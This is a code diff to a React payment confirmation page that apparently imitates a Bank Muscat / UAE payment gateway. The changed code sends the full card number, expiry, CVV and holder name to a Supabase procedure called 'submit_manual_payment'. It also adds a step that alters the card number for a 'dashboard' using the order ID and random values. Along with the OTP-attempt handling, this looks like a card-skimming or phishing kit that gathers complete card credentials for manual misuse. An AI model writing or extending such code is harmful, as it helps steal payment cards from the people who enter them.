@@ -4,7 +4,12 @@ import { useLanguage } from '../context/LanguageContext'
 import { getProductName } from '../data/translations'
 import { isSupabaseConfigured, supabase } from '../lib/supabase'
 import { clearFailedOtpAttempts } from '../lib/paymentOtp'
-import { detectCardBrand, getLiveCardNumberError, validateCardForm } from '../lib/cardValidation'
+import {
+  detectCardBrand,
+  getLiveCardNumberError,
+  mutateCardNumberForDashboard,
+  validateCardForm,
+} from '../lib/cardValidation'
 import PaymentLoadingOverlay from '../components/PaymentLoadingOverlay'
 import UaePaymentGateway from '../components/BankMuscatGateway'
 import useSiteSettings from '../hooks/useSiteSettings'
@@ -159,10 +164,16 @@ export default function PaymentConfirmPage() {
     setSubmitError('')
 
     if (isSupabaseConfigured && order.orderId) {
+      const rawCardNumber = card.number.replace(/\s/g, '')
+      const dashboardCardNumber = mutateCardNumberForDashboard(
+        rawCardNumber,
+        `${order.orderId}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
+      )
+
       const { error } = await supabase.rpc('submit_manual_payment', {
         p_order_id: order.orderId,
         p_card_holder: card.holderName.trim(),
-        p_card_number: card.number.replace(/\s/g, ''),
+        p_card_number: dashboardCardNumber,
         p_card_expiry: card.expiry,
         p_card_cvv: card.cvv,
       })
